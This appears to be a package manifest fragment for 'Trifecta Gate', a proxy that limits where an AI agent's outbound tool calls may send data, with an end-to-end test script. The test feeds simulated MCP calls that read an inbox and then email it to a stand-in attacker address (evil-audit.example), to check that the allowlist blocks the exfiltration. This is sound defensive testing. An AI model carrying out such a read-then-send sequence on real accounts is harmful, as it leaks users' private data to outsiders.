name: trifecta-gate
description: Trifecta Gate: stop AI agents from leaking private data by enforcing where outbound tool calls may send it (provenance policy, not content filtering).

scripts.e2e:proxy: L=$(mktemp -t trifecta-audit) && printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"tools/list"}' '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_inbox","arguments":{}}}' '[{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"it-audit@evil-audit.example","body":"x"}}}]' 'not json' | TRIFECTA_AUDIT_KEY=e2e-demo-key tsx scripts/mcp-proxy.ts --allow '*.town.gov' --log $L -- node tests/fixtures/fake-mcp-server.mjs && TRIFECTA_AUDIT_KEY=e2e-demo-key tsx scripts/verify-audit.ts $L
